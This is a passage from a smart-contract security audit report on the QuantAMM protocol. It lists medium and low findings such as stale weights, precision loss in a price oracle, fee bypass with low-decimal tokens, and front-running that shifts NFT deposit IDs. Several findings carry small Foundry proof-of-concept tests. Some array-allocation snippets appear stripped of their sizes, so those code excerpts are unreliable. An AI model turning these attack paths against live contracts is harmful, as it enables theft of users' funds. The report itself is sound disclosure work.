## <a id='M-17'></a>M-17. Stale Weights Due to Improper Weight Normalization and Guard Rail Violation

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

In the `_normalizeWeightUpdates()` function, the guarded weights are adjusted by subtracting any excess from the first element of the weights if the total exceeds `1e18`.

`_newWeights[0] = _newWeights[0] + (ONE - newWeightsSum);`

The comments in the code acknowledge that this adjustment may occasionally break the guard rails but consider the impact to be minimal. However, if the first weight is already at the minimum value of the guard rail (`absoluteWeightGuardRail`), this adjustment can push it below the minimum value.

When this occurs:

1. The updated weight of the first asset becomes less than the minimum, and the current weight of the asset equals the minimum.
2. These values are passed to the `_calculateMultiplerSetWeights()` function.

The function calculates `blockMultiplier` as:

`int256 blockMultiplier = (local.updatedWeights[i] - local.currentWeights[i]) / local.updateInterval;`

If the `blockMultiplier` is negative (because `currentWeights > updatedWeights`), the logic proceeds to calculate `weightBetweenTargetAndMax`:

`weightBetweenTargetAndMax = local.currentWeights[i] - local.absoluteWeightGuardRail18;`

Since `currentWeights[i]` is already at the minimum, `weightBetweenTargetAndMax` becomes 0. This sets `currentLastInterpolationPossible` to 0:

`if (currentLastInterpolationPossible < int256(type(int40).max) - int256(int40(uint40(block.timestamp)))) `
this condition will always be true

As a result, the `lastTimestampThatInterpolationWorks` value is set to `block.timestamp + 0`.

In `QuantAMMWeightedPool.sol`, this value leads to stale weights when `onSwap()` or `_getNormalisedWeight()` is called. Due to the following condition:

if (block.timestamp >= variables.lastPossibleInterpolationTime) {
multiplierTime = variables.lastPossibleInterpolationTime;
}

The timestamp comparison always returns true, resulting in stale weight data for the users because the multiplier time will be same time when setting the weights and timeSinceLastUpdate will always be 0.


## Vulnerability Details

1. Adjustment to weights in `_normalizeWeightUpdates()` can break guard rails.
2. This causes issues in `_calculateMultiplerSetWeights()` when `currentWeights[i]` is already at its minimum.
3. The `lastTimestampThatInterpolationWorks` becomes `block.timestamp`, leading to stale weight data.

## Impact

Users will get stale weight values.

## Tools Used

Manual Review

## Recommendations

## <a id='M-18'></a>M-18. incorrect length check in `_setIntermediateVariance` will DOS manual setting of `intermediateVarianceStates` after pool initialization

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The UpdateWeightRunner provides a function (`setIntermediateValuesManually`) that allows the QuantAMM admin to manually set the intermediate variables of a rule, asides from setting the initial intermediate variables on pool initialization , it can also be used as a break-glass feature to set/reset the intermediate variables of a rule if necessary.
The issue is that the length check in the function `QuantAMMVarianceBasedRule::_setIntermediateVariance` function is incorrect and will prevent usage of this feature

## Vulnerability Details

In `QuantAMMVarianceBasedRule::_setIntermediateVariance`

```solidity
    function _setIntermediateVariance(
        address _poolAddress,
        int256[] memory _initialValues,
        uint _numberOfAssets
    ) internal {
        uint storeLength = intermediateVarianceStates[_poolAddress].length;

        if ((storeLength == 0 && _initialValues.length == _numberOfAssets) || _initialValues.length == storeLength) { <@
            //should be during create pool
            intermediateVarianceStates[_poolAddress] = _quantAMMPack128Array(_initialValues);
        } else {
            revert("Invalid set variance");
        }
    }
```

The issue is that `intermediateVarianceStates` is a packed array with `length = numberOfAssets/2` whereas `initialValues` is an array with `length = numberOfAssets`. This means that the function will always revert when `storeLength` is not 0(i.e. when pool is already initialized).

## Impact

Medium - Break-glass feature, where the QuantAMM admin can manually set the intermediate variance if necessary,  will be unusable

## Tools Used

Manual Review

## Recommendations

```solidity
    function _setIntermediateVariance(
        address _poolAddress,
        int256[] memory _initialValues,
        uint _numberOfAssets
    ) internal {
        uint storeLength = intermediateVarianceStates[_poolAddress].length;

        if ((storeLength == 0 && _initialValues.length == _numberOfAssets) || storeLength * 2 >= _initialValues.length) { <@
            //should be during create pool
            intermediateVarianceStates[_poolAddress] = _quantAMMPack128Array(_initialValues);
        } else {
            revert("Invalid set variance");
        }
    }
```


# Low Risk Findings

## <a id='L-01'></a>L-01. Inconsistent timestamp storage when the LPNFT is transferred.

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

In the `afterUpdate` function of the `UpliftOnlyExample` contract, during NFT transfers, the `blockTimestampDeposit` is incorrectly set using `block.number` instead of `block.timestamp`, which is inconsistent with how it's set during initial deposits. This creates an invalid timestamp record.

## Vulnerability Details
In `addLiquidityProportional()`, when creating new FeeData entries, `blockTimestampDeposit` is set to `block.timestamp`:

```solidity
function addLiquidityProportional( // ...
      poolsFeeData[pool][msg.sender].push(
            FeeData({
                tokenID: tokenID,
                amount: exactBptAmountOut,
                //this rounding favours the LP
@>           lpTokenDepositValue: depositValue,
                //known use of timestamp, caveats are known.
                blockTimestampDeposit: uint40(block.timestamp),
                upliftFeeBps: upliftFeeBps
            })
        );
```

However, in `afterUpdate()` when transferring LPNFTs, it incorrectly uses `block.number` instead:
```solidity
function afterUpdate(address _from, address _to, uint256 _tokenID) public {
// ... snip ...
@>          feeDataArray[tokenIdIndex].blockTimestampDeposit = uint32(block.number);
```
This creates an inconsistency where:
1. Original deposits store Unix timestamps (seconds since epoch)
2. Transferred positions store block numbers
3. The field type is uint40 but block.number is cast to uint32

## Impact
Although currently the value of `blockTimestampDeposit` is not used in any calculations, still users will get a wrong (inconsistent) time recorded on chain in case they transfer the LPNFT to another address.

## Tools Used
Manual code review

## Recommendations
Be consistent with using `block.timestamp` in the function `afterUpdate`.
```solidity
feeDataArray[tokenIdIndex].blockTimestampDeposit = uint40(block.timestamp);
```

## <a id='L-02'></a>L-02. Critical Precision Loss in MultiHopOracle Price Calculations

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The MultiHopOracle contract exhibits severe precision loss when processing multiple small values in sequence or handling chained operations with inversions. Testing shows losses of up to 100% in some scenarios, rendering the oracle completely unreliable for certain token pairs.

## Vulnerability Details

**Location:** `pkg/pool-quantamm/contracts/MultiHopOracle.sol`

The vulnerability manifests in two critical scenarios:

1. **Multiple Small Values**:

```solidity
// Sequential operations in the loop
for (uint i = 1; i < oracleLength; ) {
    HopConfig memory oracleConfig = oracles[i];
    (int216 oracleRes, uint40 oracleTimestamp) = oracleConfig.oracle.getData();
    
    if (oracleConfig.invert) {
        data = (data * 10 ** 18) / oracleRes;
    } else {
        data = (data * oracleRes) / 10 ** 18;
    }
    unchecked {
        ++i;
    }
}
```

Complete loss of precision (100%) when handling very small values in sequence.

1. **Chained Operations with Inversion**:

```solidity
// First oracle inversion (if needed)
if (firstOracle.invert) {
    data = 10 ** 36 / data;
}

// Subsequent oracle inversions
if (oracleConfig.invert) {
    data = (data * 10 ** 18) / oracleRes;
} else {
    data = (data * oracleRes) / 10 ** 18;
}
```

Massive overestimation due to precision loss in inverted calculations, especially when combining multiple operations.

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../../../contracts/mock/MockChainlinkOracles.sol";
import "../../../contracts/MultiHopOracle.sol";

contract MultiHopOraclePrecisionLossTest is Test {
    MockChainlinkOracle internal chainlinkOracle1;
    MockChainlinkOracle internal chainlinkOracle2;
    MultiHopOracle internal multiHopOracle;

    // Helper function to deploy the oracles - similar to original test
    function deployOracles(
        int216 fixedValue1,
        int216 fixedValue2,
        uint delay1,
        uint delay2,
        bool[] memory invert
    ) internal returns (MultiHopOracle) {
        chainlinkOracle1 = new MockChainlinkOracle(fixedValue1, delay1);
        chainlinkOracle2 = new MockChainlinkOracle(fixedValue2, delay2);

        MultiHopOracle.HopConfig[] memory hops = new MultiHopOracle.HopConfig[]();
        hops[0] = MultiHopOracle.HopConfig({ oracle: OracleWrapper(address(chainlinkOracle1)), invert: invert[0] });
        hops[1] = MultiHopOracle.HopConfig({ oracle: OracleWrapper(address(chainlinkOracle2)), invert: invert[1] });

        return new MultiHopOracle(hops);
    }

    function testPrecisionLossWithMultipleSmallValues() public {
        // Test with extremely small decimal values
        // Using 1e-15 * 1e-15 which should equal 1e-30
        // But due to precision loss with intermediate 1e18 scaling, it won't
        int216 value1 = 1e3;     // 1e-15 with 18 decimals (1e3)
        int216 value2 = 1e3;     // 1e-15 with 18 decimals (1e3)
        
        uint delay = 3600;
        bool[] memory invert = new bool[]();
        invert[0] = false;
        invert[1] = false;

        multiHopOracle = deployOracles(value1, value2, delay, delay, invert);
        
        vm.warp(block.timestamp + delay);
        
        (int216 actualResult,) = multiHopOracle.getData();
        
        // Expected result: 1e-30 with 18 decimals precision
        // 1e-30 * 1e18 = 1e-12
        int216 expectedResult = 1;  // 1e-12 represented with 18 decimals
        
        assertFalse(actualResult == expectedResult, "Should show precision loss");
        
        int216 difference = expectedResult - actualResult;
        
        emit log_named_int("Expected Result", int(expectedResult));
        emit log_named_int("Actual Result", int(actualResult));
        emit log_named_int("Difference", int(difference));
        
        // Calculate relative error
        int216 percentageError = (difference * 100e18) / expectedResult;
        emit log_named_int("Percentage Error (scaled by 1e18)", int(percentageError));
    }

    function testPrecisionLossInChainedOperations() public {
        // Test precision loss with extreme values:
        // Starting with a very large value (1e20) and dividing by a very small value (1e-16)
        // This should stress the precision limits of the calculations
        int216 value1 = 1e20;        // Very large value
        int216 value2 = 1e2;         // Very small value (will be inverted)
        
        uint delay = 3600;
        bool[] memory invert = new bool[]();
        invert[0] = false;
        invert[1] = true;  // Invert second value

        multiHopOracle = deployOracles(value1, value2, delay, delay, invert);
        
        vm.warp(block.timestamp + delay);
        
        (int216 actualResult,) = multiHopOracle.getData();
        
        // Expected: 1e20 * (1/1e2) = 1e18
        int216 expectedResult = 1e18;
        
        assertFalse(actualResult == expectedResult, "Should show precision loss");
        
        int216 difference = expectedResult - actualResult;
        
        emit log_named_int("Expected Result", int(expectedResult));
        emit log_named_int("Actual Result", int(actualResult));
        emit log_named_int("Difference", int(difference));
        
        // Calculate percentage error: (difference / expectedResult) * 100
        int216 percentageError = (difference * 100e18) / expectedResult;
        emit log_named_int("Percentage Error (scaled by 1e18)", int(percentageError));
    }
}
```

Test Results:

```Solidity
1. Multiple Small Values Test:
Expected: 1 (1e-12 with 18 decimals)
Actual:   0
Loss:     100%

2. Chained Operations Test:
Expected: 1000000000000000000
Actual:   1000000000000000000000000000000000000
Error:    ~1e41 magnitude deviation
```

## Impact

**Severity: HIGH**

1. Technical Impact:
   * Complete loss of precision (100%) in small value calculations
   * Massive overestimation in chained operations with inversion
   * Affects all multi-hop oracle paths with small values or inversions

2. Economic Impact:
   * Incorrect pricing for micro-tokens
   * Unreliable price feeds for inverted pairs
   * Potential arbitrage opportunities
   * Strategy miscalculations leading to losses

## Tools Used

* Foundry testing framework
* Custom precision loss test suite
* Manual code review
* Mathematical analysis of fixed-point arithmetic operations

## Recommendations

1. Implement Precision-Safe Calculations:

```solidity
contract MultiHopOracle {
    uint256 constant PRECISION_SCALAR = 1e9;
    
    function getData() public view returns (int216 data, uint256 timestamp) {
        // ... existing code ...
        
        // Higher precision intermediate calculations
        uint256 scaledResult = uint256(data) * uint256(oracleRes) * PRECISION_SCALAR;
        data = int216(scaledResult / (10 ** 18 * PRECISION_SCALAR));
        
        // ... existing code ...
    }
}
```

1. Add Value Range Validation:

```solidity
// Minimum/maximum thresholds
int216 constant MIN_VALUE = 1e3;   // 1e-15 with 18 decimals
int216 constant MAX_VALUE = 1e40;  // Based on int216 limits

function validateValue(int216 value) internal pure {
    require(abs(value) >= MIN_VALUE || value == 0, "Value too small");
    require(abs(value) <= MAX_VALUE, "Value too large");
}
```

1. Architectural Changes:
   * Use a precision-focused math library
   * Implement circuit breakers for extreme values
   * Add monitoring for precision loss events
   * Consider alternative scaling approaches for small values

## References

* [Fixed Point Math Best Practices](https://docs.soliditylang.org/en/v0.8.24/types.html#fixed-point-numbers)
* [Chainlink Price Feed Implementation Guide](https://docs.chain.link/data-feeds/price-feeds)

## <a id='L-03'></a>L-03. Using front-run or a reorg attack it is possible steal higher value deposits from the sender by shifting NFT ID

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

If a user performs at least two deposits and a transfer in the same block it can encourage the receiver to front-run or reorg if one of the deposits has a much higher value.

## Vulnerability Details

Because the deposits are identified by NFT tokenIDs. In a scenario where:

* User makes two deposits. First gets ID: 1 and has a a large amount of tokens deposited. Second gets ID: 2 and has low amount of tokens deposited.
* Same depositer makes a transfer to a receiver. And the transfer contains the NFT with ID: 2 which had a low amount of tokens deposited.

In this scenario the receiver can be incetivized enough to try front-run or do a reorg attack where if the first two deposits are front-runned or another deposit is put in front (reorg), their corresponding IDs will shift by one (ID: 1 -> ID: 2, ID: 2 -> ID: 3), but the amounts will not. Because of this now the transfer with ID: 2 will contain  large amount of tokens and the receiver will benefit.

## Impact

Receiver can manipulate transaction order to steal a higher value deposit. But this requires specific conditions (multiple transactions in a single block) and original depositer has to send a deposit to the attacker or someone willing to attack.

This can also in theory happen by accident if a user sends all the transaction one after another, but they are not executed in the expected order.\
\
Similar attack can be done using block re-ordering, but would require considerably more resources.

The attack can result in considerable funds lost, but due to  special conditions required (multiple transactions and malicious receiver) - Medium.

## Tools Used

Manual review + foundry tests.

```solidity
// Same can be achieved with transaction reordering
function testFrontRunAllowsStealingHigherValueDeposits() public {
    uint256[] memory maxAmountsIn = [dai.balanceOf(alice), usdc.balanceOf(alice)].toMemoryArray();
    uint256 input = 1e18;

    // Bob front-runs Alice deposits to increase the original minted NFT IDs
    vm.prank(bob);
    upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, 1, false, bytes(""));

    // Alice makes two deposits where one is of much higher value than the other
    vm.prank(alice);
    // Orignal ID 1 -> due to front-run -> ID 2
    upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, input * 10, false, bytes(""));

    vm.prank(alice);
    // Orignal ID 2 -> due to front-run -> ID 3
    upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, input, false, bytes(""));

    LPNFT nft = LPNFT(upliftOnlyRouter.lpNFT());

    // Alice transfers ID 2 (original intention was to transfer "input" amount deposit)
    // Due to NFT ID shift, now she transfers the higher value deposit "input * 10"
    vm.prank(alice);
    nft.transferFrom(address(alice), address(bob), 2);


    UpliftOnlyExample.FeeData[] memory bobFeeData = upliftOnlyRouter.getUserPoolFeeData(pool, bob);

    console2.log("---BOB NFT---");
    console2.log("bobFeeData length", bobFeeData.length);
    console2.log("bobFeeData[0] tokenID", bobFeeData[0].tokenID);
    console2.log("bobFeeData[0] amount", bobFeeData[0].amount);
}
```

## Recommendations

Few possible approaches.

1\) Intead of TokenID, specfiy the amount user wants to transfer. And perform similar functionality to fees, where the code goes through all sender owned deposits and takes necessary amounts. Using those amounts creates a new deposit for the receiver.

2\) Add a maxSent parameter to transfer which would verify that no more than maxSent tokens are transfered with the NFT.

3\) Add a timelock on deposits to prevent immediate transfers.

4\) Use a deterministic hash like `NFT ID = hash(++numMinted, bptAmount)` even if the transfer is front-runned the ID will no longer correspond to the original one. And even if they still match the deposit amount will be the same and therefore same Bpt amount will be transferred.

## <a id='L-04'></a>L-04. Incorrect event emitted in `setUpdateWeightRunnerAddress()` function

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## \[L-01] Incorrect event emitted in \`setUpdateWeightRunnerAddress()\` function

## Summary

Incorrect event emitted in \`setUpdateWeightRunnerAddress()\` function. When changing the `UpdateWeightRunner.sol` address, the event should emit 2 params - old and new addresses:

```solidity
event UpdateWeightRunnerAddressUpdated(address indexed oldAddress, address indexed newAddress);
```

The issue is that this function does not store the old address in memory, but returns the updated `updateWeightRunner` variable as first param instead of old `updateWeightRunner`:

```solidity
function setUpdateWeightRunnerAddress(address _updateWeightRunner) external override {
        require(msg.sender == quantammAdmin, "ONLYADMIN");
        updateWeightRunner = UpdateWeightRunner(_updateWeightRunner);
        emit UpdateWeightRunnerAddressUpdated(address(updateWeightRunner), _updateWeightRunner); 
    }
```

## Impact

Frontend or other off-chain services may display incorrect values, potentially misleading users, disrupt update tracking and make it difficult to find updates.

## Recommendations

```diff
function setUpdateWeightRunnerAddress(address _updateWeightRunner) external override {
        require(msg.sender == quantammAdmin, "ONLYADMIN");
+       address oldUpdateWeightRunner = updateWeightRunner;
        updateWeightRunner = UpdateWeightRunner(_updateWeightRunner);
-       emit UpdateWeightRunnerAddressUpdated(address(updateWeightRunner), _updateWeightRunner);
+       emit UpdateWeightRunnerAddressUpdated(oldUpdateWeightRunner, _updateWeightRunner);  
    }
```

## <a id='L-05'></a>L-05. Inconsistent event data in `WeightsUpdated` emissions

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `QuantAMMWeightedPool::setWeights` and `QuantAMMWeightedPool::_setInitialWeights` functions both emit the `WeightsUpdated` event, but the data emitted is inconsistent. The `QuantAMMWeightedPool::setWeights` function includes the pool address and an array of both weight and multiplier metrics in the event data. In contrast, the `QuantAMMWeightedPool::_setInitialWeights` function emits the pool address and an array of only weight metrics.

`QuantAMMWeightedPool::setWeights` function:

```solidity
function setWeights(
    int256[] calldata _weights,
    address _poolAddress,
    uint40 _lastInterpolationTimePossible
) external override {
    require(msg.sender == address(updateWeightRunner), "ONLYUPDW");
    // _weights.length == _totalTokens * 2 (an array of both weight and multiplier metrics)
=>  require(_weights.length == _totalTokens * 2, "WLDL");
    ...
=>  emit WeightsUpdated(_poolAddress, _weights);
}
```

`QuantAMMWeightedPool::_setInitialWeights` function:

```solidity
function _setInitialWeights(int256[] memory _weights) internal {
    require(_normalizedFirstFourWeights == 0, "init");
    require(_normalizedSecondFourWeights == 0, "init");
    // _weights.length == _totalTokens (an array of only weight metrics)
=>  InputHelpers.ensureInputLengthMatch(_totalTokens, _weights.length);
    ...
=>  emit WeightsUpdated(address(this), _weights);
}
```

## Impact

The inconsistency in emitted event data may lead to incorrect data indexing on off-chain services, potentially causing confusion or errors in data processing.

## Recommendations

Update the `QuantAMMWeightedPool::_setInitialWeights` function:

```diff
function _setInitialWeights(int256[] memory _weights) internal {
    require(_normalizedFirstFourWeights == 0, "init");
    require(_normalizedSecondFourWeights == 0, "init");
    
    InputHelpers.ensureInputLengthMatch(_totalTokens, _weights.length);

    int256 normalizedSum;
    int256[] memory _weightsAndBlockMultiplier = new int256[]();
    ...
-   emit WeightsUpdated(address(this), _weights);
+    emit WeightsUpdated(address(this), _weightsAndBlockMultiplier);
}
```

## <a id='L-06'></a>L-06. Fee Bypass Through Precision Loss in Low-Decimal Tokens

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `UpliftOnlyExample` contract's fee calculation mechanism can be bypassed for significant amounts when using low-decimal tokens like `GUSD` (2 decimals). This allows users to execute large trades without paying any fees, leading to potential revenue loss for the protocol and the pool creator.

## Vulnerability Details

**NOTE:** As per the protocol readme: all balancer tokens are in scope and `GUSD` is a valid balancer token.

The fee calculation in `UpliftOnlyExample::afterSwap` hook uses the following formula:\
[UpliftOnlyExample.sol#L298](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L298)

```js
uint256 hookFee = params.amountCalculatedRaw.mulUp(hookSwapFeePercentage);
```

With 0.1% fee setting:

```js
hookFee = amountCalculatedRaw * 1e15 / 1e18
        = amountCalculatedRaw / 1000
```

For zero fee (rounding down in integer arithmetic):

```js
amountCalculatedRaw / 1000 < 1
amountCalculatedRaw < 1000
```

For `GUSD` (2 decimals):

1000 base units = 10.00 GUSD\
Therefore, any amount up to 9.99 GUSD will result in zero fees.

Concrete Example:

1. Trade amount: 9.99 GUSD = 999 base units
2. Fee calculation with 0.1% fee:

```js
999 * 1e15 / 1e18 = 0.999 (rounds down to 0)
```

## Impact

Swap fee can be bypassed for low-decimal tokens

## Tools Used

Manual Review

## Recommendations

Use decimal normalization for fee calculations

## <a id='L-07'></a>L-07. `minWithdrawalFeeBps` are not added to `upliftFeeBps` causing loss of fees and allowing MEV actions

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

> _**Note!:**_ This bug assumes that `upliftFeeBps` is applied in the upLifted value only as intended in the whitePaper and assumes the rounding down to 0 of `lpTokenDepositValueChange` is solved

The `UpliftOnlyExample` contract's uplift fee calculation can result in fees lower than the intended minimum when small uplifts occur, potentially enabling MEV attacks that were meant to be prevented by `minWithdrawalFeeBps`.

## Vulnerability Details

Current implementation uses an if/else block that chooses between fees types during liquidity removal:

```solidity
if (localData.lpTokenDepositValueChange > 0) {
    feePerLP = (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) / 10000;
} else {
    feePerLP = (uint256(minWithdrawalFeeBps) * 1e18) / 10000;
}
```

When calculating fees for uplifted positions:

```solidity
if (localData.lpTokenDepositValueChange > 0) {
    feePerLP = (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) / 10000;
}
```

Example scenario:

1. `minWithdrawalFeeBps` = 0.5% (50 bps)
2. `upliftFeeBps` = 50% (5000 bps)
3. MEV deposits 100e18
4. Gets 1% uplift (1e18)
5. Fee calculation: 1e18 \* 50% = 5e17 (0.05% of total deposit)
6. Actual fee (0.05%) < `minWithdrawalFeeBps` (0.5%)

This creates a gap where MEV can extract value while paying less than the intended minimum fee.

## Impact

The vulnerability enables:

1. MEV attacks with fees below intended minimum (for example, just in time liquidity for large swaps and feeless swaps attacks, etc)
2. Potential value extraction through rapid deposit/withdraw cycles attacks

## Tools Used

Manual  review

## Recommendations

add the `minWithdrawalFeeBps` to the `upliftFeeBps`

## <a id='L-08'></a>L-08. The `QuantammCovarianceBasedRule::_calculateQuantAMMCovariance` returns a two dimensional array with a wrong dimension

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `QuantammCovarianceBasedRule::_calculateQuantAMMCovariance` function returns a two dimensional array of size `n*n by n` instead of a two dimensional array of size `n by n` for a pool with `n` parameters

## Vulnerability Details

The vulnerability lies [here](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammCovarianceBasedRule.sol#L47-L127) where on line 59, the two dimensional array `newState` is initialized with a dimension of `locals.nsquared` which is previously defined on line 53 as `locals.n * locals.n`. The affected code is also displayed below:

```javascript
    function _calculateQuantAMMCovariance(
        int256[]  memory _newData,
        QuantAMMPoolParameters memory _poolParameters
    ) internal returns (int256[][] memory) {
        QuantAMMCovariance memory locals;
        locals.n = _poolParameters.numberOfAssets; // Dimension of square matrix
53:     locals.nSquared = locals.n * locals.n;
        int256[][] memory intermediateCovarianceState = _quantAMMUnpack128Matrix(
            intermediateCovarianceStates[_poolParameters.pool],
            locals.n
        );


59:     int256[][] memory newState = new int256[][]();
        .
        .
        .

    }
```

## Impact

Any functions that depend on the return value of `QuantammCovarianceBasedRule::_calculateQuantAMMCovariance` could run into issues if the dimensions of the two dimensional array are needed for some decision taking. Moreover, only the first `locals.n` rows of the array are filled with non-zero values while the remaining `locals.nsquared - locals.n` rows only contain zeros.

## Tools Used

Manual Review

Foundry

## Recommendations

Consider modifying `QuantammCovarianceBasedRule::_calculateQuantAMMCovariance` as below:

```diff
    function _calculateQuantAMMCovariance(
        int256[]  memory _newData,
        QuantAMMPoolParameters memory _poolParameters
    ) internal returns (int256[][] memory) {
        QuantAMMCovariance memory locals;
        locals.n = _poolParameters.numberOfAssets; // Dimension of square matrix
        locals.nSquared = locals.n * locals.n;
        int256[][] memory intermediateCovarianceState = _quantAMMUnpack128Matrix(
            intermediateCovarianceStates[_poolParameters.pool],
            locals.n
        );


-       int256[][] memory newState = new int256[][]();
+       int256[][] memory newState = new int256[][]();
        .
        .
        .

    }
```

## <a id='L-09'></a>L-09. Incorrect event emission can be done as a griefing attack

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The [`UpdateWeightRunner::setRuleForPool`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L235) lacks validation that allows anyone to set rules for any address which may or may not be a pool, allowing attackers to grief spam events.

## Vulnerability Details

The [`UpdateWeightRunner::setRuleForPool`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L235) is used for setting rules for a pool

```solidity
    function setRuleForPool(IQuantAMMWeightedPool.PoolSettings memory _poolSettings) external {
        require(address(rules[msg.sender]) == address(0), "Rule already set");
        require(_poolSettings.oracles.length > 0, "Empty oracles array");
        require(poolOracles[msg.sender].length == 0, "pool rule already set");
```

However, it lacks checks to see if the calling address is actually a pool
This allows griefers to spam events by simply calling `setRuleForPool` from any address.

As per the spec given, event emission is indeed used by the protocol for tracking rule changes

```solidity
    // emit event for easier tracking of rule changes
    emit PoolRuleSet(
        address(_poolSettings.rule),
        _poolSettings.oracles,
        _poolSettings.lambda,
        _poolSettings.ruleParameters,
        _poolSettings.epsilonMax,
        _poolSettings.absoluteWeightGuardRail,
        _poolSettings.updateInterval,
        _poolSettings.poolManager
    );
```

Hence, it can affect the offchain mechanism of the protocol

## Impact

1. Incorrect Event will be emitted which is not intended
2. Offchain mechanism griefing can be done by the attackers.

## Proof of Concept

Add the below test case inside the `UpdateWeightRunner.t.sol` file:

```solidity
    function testAnyoneCanSetRule() public {
        uint40 blockTime = uint40(block.timestamp);
        int256[] memory weights = new int256[]();
        weights[0] = 0.5e18;
        weights[1] = 0.5e18;
        weights[2] = 0;
        weights[3] = 0;
        
        int216 fixedValue = 1000;
        uint delay = 3600;
        chainlinkOracle = deployOracle(fixedValue, delay);

        vm.startPrank(owner);
        updateWeightRunner.addOracle(OracleWrapper(chainlinkOracle));
        vm.stopPrank();


        address[][] memory oracles = new address[][]();
        oracles[0] = new address[]();
        oracles[0][0] = address(chainlinkOracle);

        uint64[] memory lambda = new uint64[]();
        lambda[0] = 0.0000000005e18;

        address randomAddress = vm.addr(321);
        vm.startPrank(address(randomAddress));
        
        updateWeightRunner.setRuleForPool(
            IQuantAMMWeightedPool.PoolSettings({
                assets: new IERC20[](0),
                rule: mockRule,
                oracles: oracles,
                updateInterval: 1,
                lambda: lambda,
                epsilonMax: 0.2e18,
                absoluteWeightGuardRail: 0.2e18,
                maxTradeSizeRatio: 0.2e18,
                ruleParameters: new int256[][](),
                poolManager: addr2
            })
        );
        vm.stopPrank();
  
    }
```

## Tools Used

Manual Review
Foundry

## Recommendations

It is recommended to only allow setting rules for pools deployed via Factory contract.

## <a id='L-10'></a>L-10. Potential Mismatch Between `setWeightsManually` and `setWeights` Functionality

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `setWeightsManually` function allows an admin or pool manager to manually set pool weights. However, this function does not account for block multipliers, while the `setWeights` function, which it calls, explicitly expects weights and their corresponding block multipliers as input. This mismatch can lead to runtime errors or unintended behavior, particularly when `_weights` does not match the required format for `setWeights`.

## Vulnerability Details

The [`setWeightsManually`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L559-L588) function only processes and validates weight values without considering block multipliers.

```solidity
    function setWeightsManually(
        int256[] calldata _weights,
        address _poolAddress,
        uint40 _lastInterpolationTimePossible,
        uint _numberOfAssets
    ) external {
        uint256 poolRegistryEntry = QuantAMMWeightedPool(_poolAddress).poolRegistry();
        if (poolRegistryEntry & MASK_POOL_OWNER_UPDATES > 0) {
            require(msg.sender == poolRuleSettings[_poolAddress].poolManager, "ONLYMANAGER");
        } else if (poolRegistryEntry & MASK_POOL_QUANTAMM_ADMIN_UPDATES > 0) {
            require(msg.sender == quantammAdmin, "ONLYADMIN");
        } else {
            revert("No permission to set weight values");
        }

        //though we try to keep manual overrides as open as possible for unknown unknows
        //given how the math library works weights it is easiest to define weights as 18dp
        //even though technically G3M works of the ratio between them so it is not strictly necessary
        //CYFRIN L-02
        for (uint i; i < _weights.length; i++) {
            if (i < _numberOfAssets) {
                require(_weights[i] > 0, "Negative weight not allowed"); 
                require(_weights[i] < 1e18, "greater than 1 weight not allowed");
            }
        }

        IQuantAMMWeightedPool(_poolAddress).setWeights(_weights, _poolAddress, _lastInterpolationTimePossible);

        emit SetWeightManual(msg.sender, _poolAddress, _weights, _lastInterpolationTimePossible);
    }

```

The [`setWeights`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L617-L640) function expects the `_weights` parameter to include both weights and block multipliers, with the length being twice the number of total tokens.

```solidity
    function setWeights(
        int256[] calldata _weights,
        address _poolAddress,
        uint40 _lastInterpolationTimePossible
    ) external override {
        require(msg.sender == address(updateWeightRunner), "ONLYUPDW");
>>      require(_weights.length == _totalTokens * 2, "WLDL"); //weight length different

        if (_weights.length > 8) {
            int256[][] memory splitWeights = _splitWeightAndMultipliers(_weights);
            _normalizedFirstFourWeights = quantAMMPack32Array(splitWeights[0])[0];
            _normalizedSecondFourWeights = quantAMMPack32Array(splitWeights[1])[0];
        } else {
            _normalizedFirstFourWeights = quantAMMPack32Array(_weights)[0];
        }

        //struct allows one SSTORE
        poolSettings.quantAMMBaseInterpolationDetails = QuantAMMBaseInterpolationVariables({
